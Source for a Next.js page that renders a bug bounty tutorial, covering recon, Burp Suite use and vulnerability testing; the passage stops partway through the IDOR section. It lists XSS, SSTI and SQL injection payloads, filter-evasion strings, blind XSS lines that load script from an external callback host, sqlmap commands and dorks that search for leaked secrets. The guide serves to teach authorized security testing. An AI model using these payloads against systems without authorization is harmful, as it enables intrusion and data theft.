"use client"

import { useState, useEffect } from "react"
import Link from "next/link"
import { MainSidebar } from "@/components/main-sidebar"
import { PageTitle } from "@/components/page-title"
import {
  ArrowRight, ChevronRight, Flame, Shield, Target, Zap, Code,
  Search, Bug, Globe, Terminal, CheckCircle, Brain, Eye, Link as LinkIcon,
  FileText, Wrench, ChevronDown, ChevronUp, Heart,
} from "lucide-react"
import { cn } from "@/lib/utils"

const toc = [
  { id: "how-i-deal", label: "How I Deal with Bug Hunting", icon: Heart },
  { id: "mindset", label: "1. Mindset & Core Rules", icon: Brain },
  { id: "platform", label: "2. Picking a Platform", icon: Globe },
  { id: "program", label: "3. Picking a Program", icon: Target },
  { id: "recon", label: "4. Phase 1 — Recon", icon: Search },
  { id: "explore", label: "5. Phase 2 — Manual Exploration", icon: Eye },
  { id: "burp", label: "6. Phase 3 — Burp Suite", icon: Terminal },
  { id: "vulns", label: "7. Phase 4 — Vuln Testing", icon: Bug },
  { id: "waf", label: "8. WAF Bypass", icon: Shield },
  { id: "chain", label: "9. Chaining Vulns", icon: LinkIcon },
  { id: "reporting", label: "10. Reporting", icon: FileText },
  { id: "tools", label: "11. Tools Reference", icon: Wrench },
]

function CodeBlock({ children }: { children: string }) {
  return <pre className="my-3 overflow-x-auto rounded-lg border border-border bg-zinc-950 p-4 text-sm font-mono text-zinc-100"><code>{children}</code></pre>
}

function Table({ headers, rows }: { headers: string[]; rows: string[][] }) {
  return (
    <div className="my-4 overflow-x-auto rounded-lg border border-border">
      <table className="w-full text-sm">
        <thead><tr className="border-b border-border bg-muted/50">
          {headers.map((h, i) => <th key={i} className="px-4 py-2 text-left font-medium text-foreground">{h}</th>)}
        </tr></thead>
        <tbody>{rows.map((row, i) => (
          <tr key={i} className="border-b border-border last:border-0">
            {row.map((cell, j) => <td key={j} className="px-4 py-2 text-muted-foreground">{cell}</td>)}
          </tr>
        ))}</tbody>
      </table>
    </div>
  )
}

function Section({ id, icon: Icon, color, title, expanded, onToggle, children }: {
  id: string; icon: any; color: string; title: string; expanded: boolean; onToggle: () => void; children: React.ReactNode
}) {
  return (
    <section id={id} className="mb-6">
      <button onClick={onToggle} className={cn("flex w-full items-center gap-3 rounded-xl border border-border bg-card/50 p-4 transition-all hover:border-primary/30 hover:bg-card mb-3")}>
        <span className={cn("flex h-10 w-10 items-center justify-center rounded-xl shrink-0", color)}><Icon className="h-5 w-5" /></span>
        <h2 className="text-2xl font-bold text-foreground flex-1 text-left">{title}</h2>
        {expanded ? <ChevronUp className="h-5 w-5 text-muted-foreground shrink-0" /> : <ChevronDown className="h-5 w-5 text-muted-foreground shrink-0" />}
      </button>
      {expanded && <div className="pl-2">{children}</div>}
    </section>
  )
}

export default function HopePage() {
  const [activeSection, setActiveSection] = useState("")
  const [expanded, setExpanded] = useState<Set<string>>(new Set(toc.map(t => t.id)))
  const toggle = (id: string) => setExpanded(p => { const n = new Set(p); n.has(id) ? n.delete(id) : n.add(id); return n })

  useEffect(() => {
    const obs = new IntersectionObserver(e => e.forEach(en => { if (en.isIntersecting) setActiveSection(en.target.id) }), { rootMargin: "-20% 0px -80% 0px" })
    toc.forEach(({ id }) => { const el = document.getElementById(id); if (el) obs.observe(el) })
    return () => obs.disconnect()
  }, [])

  return (
    <div className="min-h-screen bg-background">
      <PageTitle title="HOPE — Bug Bounty Guide" />
      <MainSidebar />
      <main id="main-content" className="lg:pl-64">
        {/* Hero */}
        <section className="relative min-h-[60vh] flex items-center justify-center overflow-hidden border-b border-border/50">
          <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.02)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.02)_1px,transparent_1px)] bg-[size:64px_64px]" />
          <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] rounded-full bg-primary/5 blur-[120px]" />
          <div className="relative z-10 mx-auto max-w-4xl px-6 py-24 text-center">
            <div className="mb-6 inline-flex items-center gap-2 rounded-full border border-primary/20 bg-primary/10 px-4 py-1.5">
              <Flame className="h-4 w-4 text-primary" />
              <span className="text-xs font-medium text-primary uppercase tracking-wider">2026 Practical Bug Bounty Guide</span>
            </div>
            <h1 className="text-5xl font-bold tracking-tight sm:text-6xl lg:text-7xl">
              <span className="bg-gradient-to-r from-primary via-primary/80 to-accent bg-clip-text text-transparent">HOPE</span>
            </h1>
            <p className="mt-4 text-xl text-muted-foreground font-light">Every Expert Was Once Lost</p>
            <p className="mx-auto mt-4 max-w-2xl text-muted-foreground/70">Built on real-world experience. Opinionated by design. Updated for 2026.</p>
            <div className="mt-8 flex flex-wrap items-center justify-center gap-4">
              <a href="#how-i-deal" className="inline-flex items-center gap-2 rounded-xl bg-primary px-6 py-3 text-sm font-semibold text-primary-foreground shadow-lg shadow-primary/25 transition-all hover:shadow-xl hover:shadow-primary/30 hover:-translate-y-0.5">Start Reading <ArrowRight className="h-4 w-4" /></a>
              <Link href="/" className="inline-flex items-center gap-2 rounded-xl border border-border bg-card/50 px-6 py-3 text-sm font-medium text-foreground transition-all hover:bg-card hover:border-primary/30">Back to Home <ChevronRight className="h-4 w-4" /></Link>
            </div>
          </div>
        </section>

        <div className="mx-auto max-w-7xl px-6 py-12 flex gap-12">
          {/* Sticky TOC */}
          <aside className="hidden xl:block w-64 shrink-0">
            <nav className="sticky top-24 space-y-1" aria-label="Breadcrumb">
              {toc.map(({ id, label, icon: Icon }) => (
                <a key={id} href={`#${id}`} className={cn("flex items-center gap-2 rounded-lg px-3 py-2 text-sm transition-colors", activeSection === id ? "bg-primary/10 text-primary font-medium" : "text-muted-foreground hover:bg-muted hover:text-foreground")}>
                  <Icon className="h-4 w-4 shrink-0" />{label}
                </a>
              ))}
            </nav>
          </aside>

          <div className="min-w-0 flex-1 max-w-4xl">
            {/* 0. How I Deal with Bug Hunting */}
            <Section id="how-i-deal" icon={Heart} color="bg-rose-500/10 text-rose-500" title="How I Deal with Bug Hunting" expanded={expanded.has("how-i-deal")} onToggle={() => toggle("how-i-deal")}>
              <p className="text-muted-foreground mb-6">For each target, I create tasks for myself.</p>

              <h3 className="text-xl font-bold text-foreground mb-3">Task 1: Understanding the Application as a Normal User</h3>
              <p className="text-muted-foreground mb-3">This is the most important step. I spend 3 to 4 days testing every feature and understanding how it works.</p>
              <p className="text-muted-foreground mb-3">The best tool at this stage is the documentation of the program — it helps me understand how the application functions.</p>
              <p className="text-muted-foreground mb-6">Sometimes I find bugs just by going deep into the documentation — it is one of my favorite tools! But I&apos;m not here just to use the application. Let&apos;s move to the next step.</p>

              <h3 className="text-xl font-bold text-foreground mb-3">Task 2: Detecting &ldquo;NOS&rdquo; Moments (Denial Points)</h3>
              <div className="rounded-lg border border-rose-500/30 bg-rose-500/5 p-4 mb-4">
                <p className="text-sm font-medium text-rose-400 mb-1">What is NOS?</p>
                <p className="text-sm text-muted-foreground">&ldquo;NO&rdquo; or &ldquo;You cannot do this&rdquo; = NOS.</p>
              </div>
              <p className="text-muted-foreground mb-3"><strong className="text-foreground">Examples:</strong></p>
              <ul className="space-y-2 text-muted-foreground mb-4">
                <li>• You cannot do this on the free plan.</li>
                <li>• You cannot perform this action as a normal user.</li>
                <li>• You cannot create more than one project.</li>
              </ul>
              <p className="text-muted-foreground mb-3">For me, every restriction = a potential bug if it can be bypassed (NOS).</p>

              <h4 className="text-lg font-bold text-foreground mb-2">How to bypass NOS systems?</h4>
              <p className="text-muted-foreground mb-3">It depends on your knowledge. When you see a restriction (NOS), you start thinking of different ways to bypass it.</p>
              <p className="text-muted-foreground mb-3">If you have strong API knowledge, understand logic flaws, and have read many articles, you will be able to generate bypass scenarios in your mind.</p>
              <p className="text-muted-foreground mb-6">Sometimes I read articles where someone tests something very similar to my target. If they explain why they couldn&apos;t bypass it, I start thinking: how can I make it work on my target?</p>

              <div className="rounded-lg border border-amber-500/30 bg-amber-500/5 p-6 mb-6">
                <h4 className="text-lg font-bold text-amber-400 mb-3">The Most Important Point: Staying Motivated for a Long Time</h4>
                <p className="text-sm text-muted-foreground mb-3">Let&apos;s be honest — working without results is very difficult. This happens in bug bounty programs and freelancing in general, and it can lead to burnout.</p>
                <p className="text-sm text-muted-foreground mb-3">So how do I stay motivated while testing the same program for a long time?</p>
                <p className="text-sm text-muted-foreground mb-3">Even as a beginner, this was very hard for me, and even now I still struggle sometimes.</p>
                <div className="border-l-4 border-amber-400 pl-4 my-4">
                  <p className="text-sm italic text-amber-300 text-right" dir="rtl">وَأَنْ لَيْسَ لِلْإِنْسَانِ إِلَّا مَا سَعَىٰ وَأَنَّ سَعْيَهُ سَوْفَ يُرَىٰ ثُمَّ يُجْزَاهُ الْجَزَاءَ الْأَوْفَىٰ</p>
                  <p className="text-xs text-amber-500 mt-1">— سورة النجم 53:39–41</p>
                </div>
                <p className="text-sm text-muted-foreground mb-3">Don&apos;t chase quick money or shortcuts and then say bug bounty is not worth it. Good things take time. You will feel tired sometimes, but you must continue.</p>
                <p className="text-sm text-muted-foreground">At the same time, you also need rest and balance in life. Even completing just the first task (understanding the target) already gives me motivation and satisfaction.</p>
              </div>

              <h3 className="text-xl font-bold text-foreground mb-4">Things I Write in My Notes</h3>

              <h4 className="text-lg font-bold text-foreground mb-2">1. Write tips for your favorite targets</h4>
              <p className="text-muted-foreground mb-3">Whenever I read an article or see techniques about bypassing something, I write it down.</p>
              <p className="text-muted-foreground mb-4">If the target structure is similar to something I studied before, even if the API calls are different, I still document it because reading reports is a great source of knowledge.</p>

              <h4 className="text-lg font-bold text-foreground mb-2">2. Track progress and tasks</h4>
              <p className="text-muted-foreground mb-3">Understanding requests and logic. For example, if you see user levels like:</p>
              <CodeBlock>{'Admin = level 1\nModerator = level 2'}</CodeBlock>
              <p className="text-muted-foreground mb-3">Think:</p>
              <ul className="space-y-2 text-muted-foreground mb-4">
                <li>• Can a normal user become an admin?</li>
                <li>• Is this enforced in the backend API or only in the UI?</li>
                <li>• If I modify a request, can I bypass something?</li>
                <li>• Can I unlock admin features as a normal user?</li>
              </ul>

              <h4 className="text-lg font-bold text-foreground mb-2">3. Write what you do daily</h4>
              <p className="text-muted-foreground mb-3">Keep a daily log of your progress.</p>
              <CodeBlock>{'Day 1: 2024-12-13\n\nStarted testing the comments section\nFound an interesting parameter called to_reply'}</CodeBlock>
              <p className="text-muted-foreground mb-4">You can also record a short video instead of writing everything.</p>

              <h4 className="text-lg font-bold text-foreground mb-2">4. Save what you learn</h4>
              <p className="text-muted-foreground mb-4">When you read a book, PDF, or article, save important information in one place. Use tools like GPT to summarise it into something easier to read later.</p>

              <div className="rounded-lg border border-primary/20 bg-primary/5 p-6 my-6">
                <p className="text-lg font-semibold italic text-foreground mb-2">&ldquo;Enjoy the journey, and the money will come.&rdquo;</p>
                <p className="text-sm text-muted-foreground">— Jeff Moss (Dark Tangent), Founder of DEF CON</p>
              </div>

              <p className="text-muted-foreground mb-4">You should prioritise learning. Trust me, money is just a result of good work. Keep this mindset:</p>
              <div className="grid sm:grid-cols-2 gap-4 mb-6">
                <div className="rounded-lg border border-emerald-500/30 bg-emerald-500/5 p-4 text-center">
                  <p className="text-3xl font-bold text-emerald-400">70%</p>
                  <p className="text-sm text-muted-foreground mt-1">Testing real targets</p>
                </div>
                <div className="rounded-lg border border-cyan-500/30 bg-cyan-500/5 p-4 text-center">
                  <p className="text-3xl font-bold text-cyan-400">30%</p>
                  <p className="text-sm text-muted-foreground mt-1">Learning</p>
                </div>
              </div>
              <p className="text-muted-foreground text-center font-medium">Balance these two and you will see results.</p>
            </Section>

            {/* 1. Mindset */}
            <Section id="mindset" icon={Brain} color="bg-primary/10 text-primary" title="1. Mindset & Core Rules" expanded={expanded.has("mindset")} onToggle={() => toggle("mindset")}>
              <p className="text-muted-foreground mb-4">These rules should be tattooed on your brain before you open a single browser tab.</p>
              <div className="space-y-3">
                {[ ["PoC or GTFO.","Never submit a report without a working proof of concept."],["Know your enemy.","Spend days mapping it — not hours."],["Out-think, don't out-race.","Find the leftovers: the tacked-on import functions, the legacy API."],["Every tool lies sometimes.","Scanner alerts are hypotheses, not conclusions."],["VDP is your training ground.","Less competition, earns you private program invites."],["Barriers are your friends.","Other hunters drop off. You push through."],["Impact is king.","Always ask: what can an attacker actually achieve?"],["GDPR multiplier (EU targets).","Accessing another user's PII is a GDPR violation by definition."] ].map(([t,d],i) => (
                  <div key={i} className="flex gap-3 rounded-lg border border-border bg-card/50 p-4"><CheckCircle className="h-5 w-5 shrink-0 text-primary mt-0.5" /><div><span className="font-semibold text-foreground">{t}</span> <span className="text-muted-foreground">{d}</span></div></div>
                ))}
              </div>
            </Section>

            {/* 2. Picking a Platform */}
            <Section id="platform" icon={Globe} color="bg-blue-500/10 text-blue-500" title="2. Picking a Platform" expanded={expanded.has("platform")} onToggle={() => toggle("platform")}>
              <p className="text-muted-foreground mb-6">There is no single best platform. Pick the one that fits your current level and goals.</p>
              <h3 className="text-xl font-bold text-foreground mb-3">Intigriti</h3>
              <div className="grid sm:grid-cols-2 gap-4 mb-6">
                <div className="rounded-lg border border-emerald-500/30 bg-emerald-500/5 p-4"><p className="text-sm font-medium text-emerald-400 mb-2">Pros</p><ul className="space-y-1 text-sm text-muted-foreground"><li>• Less crowded than H1/Bugcrowd</li><li>• Triagers are helpful, no negative karma</li><li>• Community Slack access</li><li>• Many EU programs in local languages</li></ul></div>
                <div className="rounded-lg border border-rose-500/30 bg-rose-500/5 p-4"><p className="text-sm font-medium text-rose-400 mb-2">Cons</p><ul className="space-y-1 text-sm text-muted-foreground"><li>• Smaller total program count</li><li>• Fewer fully public paid programs</li></ul></div>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">HackerOne</h3>
              <div className="grid sm:grid-cols-2 gap-4 mb-6">
                <div className="rounded-lg border border-emerald-500/30 bg-emerald-500/5 p-4"><p className="text-sm font-medium text-emerald-400 mb-2">Pros</p><ul className="space-y-1 text-sm text-muted-foreground"><li>• Largest selection of programs</li><li>• Regular CTFs with private invites</li></ul></div>
                <div className="rounded-lg border border-rose-500/30 bg-rose-500/5 p-4"><p className="text-sm font-medium text-rose-400 mb-2">Cons</p><ul className="space-y-1 text-sm text-muted-foreground"><li>• Negative karma for invalid reports</li><li>• Very high competition</li></ul></div>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">Bugcrowd</h3>
              <div className="grid sm:grid-cols-2 gap-4 mb-6">
                <div className="rounded-lg border border-emerald-500/30 bg-emerald-500/5 p-4"><p className="text-sm font-medium text-emerald-400 mb-2">Pros</p><ul className="space-y-1 text-sm text-muted-foreground"><li>• Massive program selection</li><li>• Bugcrowd Academy learning resources</li><li>• Helpful triager feedback</li></ul></div>
                <div className="rounded-lg border border-rose-500/30 bg-rose-500/5 p-4"><p className="text-sm font-medium text-rose-400 mb-2">Cons</p><ul className="space-y-1 text-sm text-muted-foreground"><li>• Negative karma system</li><li>• High competition</li></ul></div>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">Finding Programs Outside Platforms</h3>
              <CodeBlock>{'site:target.com "responsible disclosure"\nsite:target.com "bug bounty"\nsite:target.com "security.txt"\n/.well-known/security.txt'}</CodeBlock>
              <p className="text-muted-foreground mt-2">Full dork collection: <a href="https://github.com/sushiwushi/bug-bounty-dorks" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">bug-bounty-dorks</a></p>
            </Section>

            {/* 3. Picking a Program */}
            <Section id="program" icon={Target} color="bg-violet-500/10 text-violet-500" title="3. Picking a Program" expanded={expanded.has("program")} onToggle={() => toggle("program")}>
              <p className="text-muted-foreground mb-4 italic">&ldquo;Picking a program is like picking a shoe — make sure it fits.&rdquo;</p>
              <h3 className="text-xl font-bold text-foreground mb-3">What to look for</h3>
              <ul className="space-y-2 text-muted-foreground mb-6"><li>• Applications where you can register accounts freely</li><li>• Multi-user, multi-role applications</li><li>• Import/export features, API integrations</li><li>• Swagger/OpenAPI docs or public developer API</li><li>• Free tier + paid tier (scope differences = BAC bugs)</li></ul>
              <h3 className="text-xl font-bold text-foreground mb-3">VDP vs Paid</h3>
              <Table headers={["","VDP","Paid"]} rows={[["Competition","Low","High"],["Hardening","Often lower","Often higher"],["Benefit","Points \u2192 private invites","Direct cash payouts"]]} />
              <p className="text-muted-foreground mt-4">Start VDP, earn private invites, <em>then</em> get paid. The money follows the process.</p>
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6">Scope Advice</h3>
              <p className="text-muted-foreground mb-3">Avoid programs with <code className="bg-muted px-1 rounded">*.target.com</code> as your first target. A wide wildcard scope sounds exciting but costs you weeks in recon before you even test. Start on main apps (<code className="bg-muted px-1 rounded">app.target.com</code> or <code className="bg-muted px-1 rounded">target.com</code>), refine your technique, <em>then</em> scale your recon.</p>
            </Section>

            {/* 4. Phase 1 — Recon */}
            <Section id="recon" icon={Search} color="bg-cyan-500/10 text-cyan-500" title="4. Phase 1 — Recon & Asset Discovery" expanded={expanded.has("recon")} onToggle={() => toggle("recon")}>
              <p className="text-muted-foreground mb-6 italic">Recon is the foundation. But remember: recon is not hacking. Its only job is to find the surface you will attack.</p>
              <h3 className="text-xl font-bold text-foreground mb-3">Subdomain Enumeration</h3>
              <CodeBlock>{'# Passive\nsubfinder -d target.com -o subdomains.txt\nassetfinder --subs-only target.com >> subdomains.txt\namass enum -passive -d target.com >> subdomains.txt\n\n# Certificate transparency\n# https://crt.sh/?q=%25.target.com\n\n# Deduplicate\nsort -u subdomains.txt -o subdomains.txt'}</CodeBlock>
              <h3 className="text-xl font-bold text-foreground mb-3">Check Which Subdomains Are Alive</h3>
              <CodeBlock>{'cat subdomains.txt | httprobe | tee alive.txt'}</CodeBlock>
              <h3 className="text-xl font-bold text-foreground mb-3">Visual Recon (Flyover)</h3>
              <CodeBlock>{'eyewitness --web -f alive.txt --timeout 30\ncat alive.txt | aquatone'}</CodeBlock>
              <h3 className="text-xl font-bold text-foreground mb-3">Port Scanning</h3>
              <CodeBlock>{'naabu -iL alive.txt -p - -o open-ports.txt\nnmap -sV -sC -p <ports> <target>'}</CodeBlock>
              <h3 className="text-xl font-bold text-foreground mb-3">Directory & Content Discovery</h3>
              <CodeBlock>{'gobuster dir -u https://target.com -w /path/to/wordlist -x php,html,js,json,bak,old,zip\nffuf -u https://target.com/FUZZ -w /path/to/wordlist -mc 200,301,302,403'}</CodeBlock>
              <h3 className="text-xl font-bold text-foreground mb-3">JavaScript Analysis</h3>
              <CodeBlock>{'python3 linkfinder.py -i https://target.com -d -o cli\ngau target.com | tee gau-urls.txt\nwaybackurls target.com | tee wayback-urls.txt'}</CodeBlock>
              <p className="text-muted-foreground mb-4">Look for: hardcoded API keys, internal endpoint paths, commented-out code, old endpoint references.</p>
              <h3 className="text-xl font-bold text-foreground mb-3">Google & GitHub Dorking</h3>
              <CodeBlock>{'# Google\nsite:target.com filetype:js\nsite:target.com inurl:api\nsite:target.com "internal use only"\nsite:target.com ext:json | ext:xml | ext:yaml\n\n# GitHub\norg:targetname password\norg:targetname secret\norg:targetname api_key\norg:targetname "Authorization:"'}</CodeBlock>
              <p className="text-muted-foreground mb-4">Reference: <a href="https://shahjerry33.medium.com/github-recon-its-really-deep-6553d6dfbb1f" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">GitHub Recon — It&apos;s Really Deep</a></p>
              <h3 className="text-xl font-bold text-foreground mb-3">Shodan & Passive Sources</h3>
              <CodeBlock>{'hostname:target.com\norg:"Target Company Name"\nssl:"target.com"'}</CodeBlock>
              <h3 className="text-xl font-bold text-foreground mb-3">Automated Vulnerability Scanning</h3>
              <CodeBlock>{'nuclei -l alive.txt -t nuclei-templates/ -o nuclei-output.txt\nnikto -h https://target.com'}</CodeBlock>
              <div className="rounded-lg border border-amber-500/30 bg-amber-500/5 p-4 mt-4"><p className="text-sm text-amber-400 font-medium">\u26a0 Scanner results are starting points, not findings. Every alarm requires manual confirmation.</p></div>
            </Section>

            {/* 5. Phase 2 — Manual Exploration */}
            <Section id="explore" icon={Eye} color="bg-emerald-500/10 text-emerald-500" title="5. Phase 2 — Manual Exploration" expanded={expanded.has("explore")} onToggle={() => toggle("explore")}>
              <p className="text-muted-foreground mb-4 italic">This phase is non-negotiable. No tool replaces understanding the application.</p>
              <h3 className="text-xl font-bold text-foreground mb-3">Setup</h3>
              <ol className="list-decimal list-inside space-y-2 text-muted-foreground mb-6"><li>Open Burp Suite with scope set to the target</li><li>Proxy all traffic through Burp</li><li>Create test accounts for every available role</li><li>Consider buying the paid tier if available</li></ol>
              <h3 className="text-xl font-bold text-foreground mb-3">The Poisoned Registration Trick</h3>
              <p className="text-muted-foreground mb-3">Inject both XSS and SSTI payloads from the start into every field:</p>
              <CodeBlock>{'<img src=x onerror=alert(document.domain)>${{7*7}}{{7*7}}'}</CodeBlock>
              <p className="text-muted-foreground mb-4">Insert this into every field: username, first name, last name, address, bio, preferences. This payload travels through the application and may fire in an admin panel, a report PDF, an email template, or a backend system days later.</p>
              <h3 className="text-xl font-bold text-foreground mb-3">Exploration Checklist</h3>
              <ul className="space-y-2 text-muted-foreground mb-6">
                <li>Use the application as a normal user for each role — trigger every feature</li>
                <li>Read the product documentation or knowledge base in full</li>
                <li>Read the API documentation / Swagger UI if available (<code className="bg-muted px-1 rounded">site:target.com swagger</code>, <code className="bg-muted px-1 rounded">site:target.com api/docs</code>)</li>
                <li>Note every privilege level and what each can do</li>
                <li>Note every integration point: import, export, webhooks, third-party logins, payment flows, email triggers</li>
                <li>Note every place that accepts file uploads</li>
                <li>Note every place that renders user-supplied content</li>
                <li>Note every URL parameter that appears to interact with the backend</li>
                <li>Create a mindmap — <a href="https://www.xmind.net/" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">XMind</a> or any tool you prefer</li>
              </ul>
              <h3 className="text-xl font-bold text-foreground mb-3">Parameters Worth Flagging</h3>
              <Table headers={["Pattern","Likely Target"]} rows={[["url=, src=, dest=, feed=, webhook=","SSRF"],["file=, page=, template=, path=, include=","LFI/RFI"],["id=, user_id=, order=, invoice=, doc=","IDOR"],["redirect=, next=, returnTo=, goto=","Open Redirect"],["q=, search=, name=, comment=","XSS / SSTI / SQLi"],["cmd=, exec=, shell=, ping=, host=","Command Injection"],["Any XML body or upload accepting XML/DOCX/SVG","XXE"]]} />
            </Section>

            {/* 6. Phase 3 — Burp Suite */}
            <Section id="burp" icon={Terminal} color="bg-amber-500/10 text-amber-500" title="6. Phase 3 — Burp Suite Deep Dive" expanded={expanded.has("burp")} onToggle={() => toggle("burp")}>
              <h3 className="text-xl font-bold text-foreground mb-3">Filter to Parameterised Requests</h3>
              <p className="text-muted-foreground mb-4">In the Burp <strong>Site Map</strong>, open the filter and enable <strong>&ldquo;Show only parameterised requests&rdquo;</strong>. This cuts the noise and surfaces the endpoints worth testing.</p>
              <h3 className="text-xl font-bold text-foreground mb-3">Repeater Strategy</h3>
              <ol className="list-decimal list-inside space-y-2 text-muted-foreground mb-6"><li>Send request to Repeater</li><li>Understand what the endpoint does by reading the response carefully</li><li>Tamper one parameter at a time — change values, remove them, duplicate them, send unexpected types (string where int is expected, negative numbers, huge numbers)</li><li>Look for different responses — an error, a changed status code, a timing difference</li></ol>
              <h3 className="text-xl font-bold text-foreground mb-3">Intruder / ffuf Strategy</h3>
              <p className="text-muted-foreground mb-4">Use Intruder (or ffuf for speed) to brute-force IDs (sequential integers, UUIDs, hashes), fuzz parameter values with injection payloads, and test for rate-limiting weaknesses.</p>
              <h3 className="text-xl font-bold text-foreground mb-3">Inferring New Endpoints</h3>
              <p className="text-muted-foreground mb-3">If you see <code className="bg-muted px-1 rounded">/api/v2/getInvoices</code>, the older <code className="bg-muted px-1 rounded">/api/v1/getInvoices</code> very likely still exists — and is probably less secure.</p>
              <ul className="space-y-2 text-muted-foreground mb-6"><li>• Version downgrades: v2 \u2192 v1, v3 \u2192 v2</li><li>• Alternate paths: /api/admin/, /internal/, /private/</li><li>• HTTP method tampering: try POST, PUT, DELETE, PATCH</li></ul>
              <h3 className="text-xl font-bold text-foreground mb-3">Hidden Parameters</h3>
              <p className="text-muted-foreground mb-3">When saving settings or profile data, intercept the request and look for parameters the UI does not expose.</p>
              <CodeBlock>{'role=admin\nisAdmin=true\nstatus=active\nplan=enterprise'}</CodeBlock>
              <p className="text-muted-foreground">Mass-assignment vulnerabilities are frequently found this way.</p>
            </Section>

            {/* 7. Phase 4 — Vulnerability Testing */}
            <Section id="vulns" icon={Bug} color="bg-red-500/10 text-red-500" title="7. Phase 4 — Vulnerability Testing" expanded={expanded.has("vulns")} onToggle={() => toggle("vulns")}>
              {/* XSS */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-4" id="xss">XSS (Cross-Site Scripting)</h3>
              <h4 className="text-lg font-bold text-foreground mb-2">Initial probe — insert everywhere</h4>
              <CodeBlock>{'<img src=x onerror=alert(document.domain)>\n<svg onload=alert(1)>\n"><script>alert(1)</script>\n{{7*7}}'}</CodeBlock>
              <h4 className="text-lg font-bold text-foreground mb-2">Stored XSS</h4>
              <p className="text-muted-foreground mb-4">Test every input displayed to other users: profile fields, comments, messages, product names, filenames, notes. Start minimal: <code className="bg-muted px-1 rounded">{'<a href="#">test</a>'}</code> — if the tag renders, escalate. Target admin-facing fields (support ticket subjects, user display names) for higher severity.</p>
              <h4 className="text-lg font-bold text-foreground mb-2">Reflected XSS</h4>
              <p className="text-muted-foreground mb-4">Test every URL parameter and search query. Check error pages (404, 403, 500) — many reflect the URL path. Check the <code className="bg-muted px-1 rounded">Referer</code> header — some apps reflect it in error messages.</p>
              <h4 className="text-lg font-bold text-foreground mb-2">DOM XSS</h4>
              <p className="text-muted-foreground mb-4">Check for dangerous JavaScript sinks: <code className="bg-muted px-1 rounded">document.write()</code>, <code className="bg-muted px-1 rounded">innerHTML</code>, <code className="bg-muted px-1 rounded">eval()</code>, <code className="bg-muted px-1 rounded">setTimeout()</code>, <code className="bg-muted px-1 rounded">location.href</code> — where any of these consume user-controlled input. DOM XSS never reaches the server, so scanning won&apos;t find it.</p>
              <h4 className="text-lg font-bold text-foreground mb-2">Blind XSS</h4>
              <p className="text-muted-foreground mb-3">Use <a href="https://xsshunter.trufflesecurity.com" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">XSS Hunter</a> — you get a callback with a screenshot when your payload fires in an admin panel or backend. Inject into every field from day one.</p>
              <CodeBlock>{'"><script src=https://yourxsshunter.xss.ht></script>\n\'"><script src=https://yourxsshunter.xss.ht></script>\njavascript:eval(\'var a=document.createElement(\\\'script\\\');a.src=\\\'https://yourxsshunter.xss.ht\\\';document.body.appendChild(a)\')'}</CodeBlock>
              <h4 className="text-lg font-bold text-foreground mb-2">XSS Filter Evasion</h4>
              <CodeBlock>{'<ScRiPt>alert(1)</ScRiPt>                          # Case variation\n<scr<script>ipt>alert(1)</scr</script>ipt>              # Breaking up keywords\n<body onresize=alert(1)>                               # Event handler alt\n<input autofocus onfocus=alert(1)>\n<svg><animate onbegin=alert(1)>\n" onmouseover="alert(1)                                 # Attribute breakout\n\' autofocus onfocus=\'alert(1)\n\'; alert(1)//                                          # JS string context\n%3Cscript%3Ealert(1)%3C%2Fscript%3E                   # URL encoding\n&lt;script&gt;alert(1)&lt;/script&gt;                     # HTML entities\nj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:alert(1)       # Newlines in JS URI'}</CodeBlock>
              {/* SSTI */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="ssti">SSTI (Server-Side Template Injection)</h3>
              <CodeBlock>{'{{7*7}}          \u2192 49 = Jinja2, Twig\n${7*7}           \u2192 49 = Freemarker, Velocity\n<%= 7*7 %>       \u2192 49 = ERB (Ruby)\n#{7*7}           \u2192 49 = Ruby (non-ERB)\n*{7*7}           \u2192 49 = Spring (Java)\n}}{{7*7}}        \u2192 Breakout then inject'}</CodeBlock>
              <p className="text-muted-foreground mb-4">Insert into every available field at account creation and throughout testing. If confirmed, use <a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">tplmap</a> for automated exploitation. SSTI can lead to RCE — escalate carefully.</p>
              {/* SQL Injection */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="sqli">SQL Injection</h3>
              <p className="text-muted-foreground mb-3">Inject into every parameter that touches the database: GET/POST body, cookies, HTTP headers (<code className="bg-muted px-1 rounded">User-Agent</code>, <code className="bg-muted px-1 rounded">X-Forwarded-For</code>, <code className="bg-muted px-1 rounded">Referer</code>). Start with <code className="bg-muted px-1 rounded">\'</code> and observe: error? different response? timing change?</p>
              <CodeBlock>{'\'\n\'\'\n\' OR \'1\'=\'1\n\' OR 1=1--\n\' AND SLEEP(5)--\n1; SELECT SLEEP(5)--\n{"$gt":""}        (NoSQL \u2014 MongoDB)'}</CodeBlock>
              <h4 className="text-lg font-bold text-foreground mb-2">Time-Based Blind</h4>
              <CodeBlock>{'\' AND SLEEP(5)--\n\'; WAITFOR DELAY \'0:0:5\'--   (MSSQL)\n\' AND BENCHMARK(5000000,MD5(1))--'}</CodeBlock>
              <CodeBlock>{'sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3 --batch\nsqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch'}</CodeBlock>
              <p className="text-muted-foreground">Also test for <strong>second-order SQLi</strong>: data stored harmlessly now may be used in a later query without sanitisation.</p>
              {/* IDOR */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="idor">IDOR / Broken Access Control</h3>
              <p className="text-muted-foreground mb-3"><strong>Setup:</strong> Create User A and User B (same role) for horizontal IDOR. Admin + Standard user for vertical BAC. Two organisations/tenants for tenant isolation testing.</p>
